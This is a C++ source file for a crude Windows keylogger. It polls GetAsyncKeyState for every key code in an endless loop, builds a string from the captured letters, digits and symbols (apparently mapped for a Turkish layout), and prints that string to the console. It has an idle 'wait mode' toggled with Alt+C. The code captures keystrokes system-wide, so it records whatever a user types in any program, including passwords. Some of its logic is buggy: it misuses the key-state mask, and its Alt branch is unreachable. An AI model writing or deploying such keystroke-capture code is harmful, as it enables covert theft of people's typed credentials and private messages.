#include <windows.h>
#include <iostream>

const char numpad_chars[] = {'0','1','2','3','4','5','6','7','8','9'};
const char* shift_chars = "=!'^+%&/()";

std::string text = "";

void printSpecialShiftChars(int i) 
{
    switch (i) {
    case 192:
        std::cout << "é";
        break;
    case 189:
        std::cout << "_";
        break;
    case 188:
        std::cout << ";";
        break;
    case 190:
        std::cout << ":";
        break;
    case 223:
        std::cout << "?";
        break;
    case 226:
        std::cout << ">";
        break;
    default:
        break;
    }
}

void printSpecialChars(int i)
{
    switch (i) {
    case 192:
        std::cout << "\"";
        break;
    case 189:
        std::cout << "-";
        break;
    case 188:
        std::cout << ",";
        break;
    case 190:
        std::cout << ".";
        break;
    case 223:
        std::cout << "*";
        break;
    case 226:
        std::cout << "<";
        break;
    default:
        break;
    }
}

void printSpecialAltChars(int i)
{
    switch (i) {
    case 192:
        std::cout << "<";
        break;
    case 189:
        std::cout << "|";
        break;
    case 188:
        std::cout << "`";
        break;
    case 226:
        std::cout << "|";
        break;
    default:
        break;
    }
}

int main() {

    int c = 0;
    bool isWaiting = false;
    while (true) {

        if (!isWaiting)
        {

            if (c > 1000)
            {
                isWaiting = true;
                std::cout << "\nwait mode enabled!" << std::endl;
            }

            for (int i = 0; i <= 256; i++) {
                short s = GetAsyncKeyState(i) * 0x8000;
                bool vk_shift = ((GetAsyncKeyState(VK_SHIFT) & 0x8000));
                bool vk_alt = (GetAsyncKeyState(VK_MENU) & 0x8000);
                bool vk_altgr = (GetAsyncKeyState(VK_RMENU) & 0x8000);
                bool isSpecial = (i == 192 || i == 189 || i == 188 || i == 190 || i == 226 || i == 223);
                if (s)
                {              
                    //system("cls");
                    std::cout << text << std::endl;                   
                    if ((i >= 96 && i <= 105))
                    {
                       //std::cout << numpad_chars[i-96];
                        text += numpad_chars[i - 96];
                    }
                    else if ((i >= 'A' && i <= 'Z'))
                    {
                        //std::cout << static_cast<char>(i);
                        text += static_cast<char>(i);
                    }
                    else if ((i >= 48 && i <=57) && (vk_shift == true)) // for top nums 
                    {
                        //std::cout << shift_chars[i - 48];
                        text += shift_chars[i - 48];
                    }
                    else if ((i >= 48 && i <= 57) && (vk_shift == false)) // for top nums 
                    {
                        //std::cout << static_cast<char>(i);
                        text += static_cast<char>(i);
                    }
                    else if (isSpecial && (vk_shift)) {
                        printSpecialShiftChars(i);
                    }
                    else if (isSpecial && !(vk_shift)) {
                        printSpecialChars(i);
                    }
                    else if (isSpecial && (vk_alt)) 
                    {
                        printSpecialAltChars(i);
                    }
                    else if (i == 8) 
                    {
                        std::cout << "\b";
                    }
                    else if (!vk_shift && !vk_alt && !vk_altgr)
                    {
                        //std::cout << "\nKEY CHAR VALUE IS " << i << std::endl;
                    }
                    c = 0;
                }
            }
        }
        else
        {
            if ((GetAsyncKeyState(VK_MENU) & 0x8000) && (GetAsyncKeyState('C') & 0x8000)) {
                isWaiting = false;
                c = 0;
                system("cls");
                std::cout << "\nwait mode disabled" << std::endl;
            }
        }

        Sleep(10);
        c++;
    }

    return 0;
}
